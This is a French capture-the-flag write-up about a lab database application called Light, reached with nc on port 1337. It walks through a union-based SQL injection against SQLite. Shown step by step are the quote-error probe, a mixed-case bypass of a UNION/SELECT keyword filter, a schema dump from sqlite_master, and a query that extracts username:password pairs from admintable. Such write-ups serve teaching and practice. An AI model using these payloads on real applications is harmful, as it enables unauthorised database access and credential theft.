- **IP**: 
```
10.10.30.206
```

- **Indice**
Je développe une application de base de données appelée Light ! Aimeriez-vous l'essayer ?
Si oui, l'application est accessible sur le port 1337. Vous pouvez vous y connecter avec la commande : `nc 10.10.30.206 1337`.
Pour commencer, vous pouvez utiliser le nom d'utilisateur « smokey ».

On tape donc la commande donnée dans l'indice avec l'username **smokey**. On obtient un mot de passe: `vYQ5ngPpw8AdUmL` .

Maintenant nous allons voir si il y a une vulnérabilité **SQLi** ave `'` . Grâce à l'erreur affiché, on voit que ça a fonctionné
![[test1.png]]

Maintenant, testons un **union based injection** avec `union select 1-- -`
![[test2.png]]

Au lieu de tenter de commenter la dernière partie à cause des erreurs provoquées par `'`, puisque SELECT 1 '' est une requête valide, nous pouvons la transformer en UNION SELECT 1 '' LIMIT 30 en ajoutant une `'` à notre requête : ' UNION SELECT 1 ''. Comme on peut le constater, cela fonctionne, mais nous rencontrons cette fois une erreur intéressante concernant certains mots non autorisés. `' union select 1 '`
![[test3.png]]

Il semble que les mots-clés UNION et SELECT ne soient pas autorisés, mais nous pouvons facilement contourner ce filtre en utilisant la casse.
![[test4.png]]

Comme on peut le voir, avec le payload `' Union Select 1 '` , on est bien avec un **union-based injection**

## Identification de la BDD
![[bddVersion.png]]

## Dumping de la BDD
maintenant que nous savons que c'est du **SQLite**, nous pouvons extraire la base ave le payload :
`' Union Select group_concat(sql) FROM sqlite_master '`
![[extractBDD.png]]

## Extraction des données
```
' Union Select group_concat(username || ":" || password) FROM admintable '
```

[Union-based injectio](https://portswigger.net/web-security/sql-injection/union-attacks)
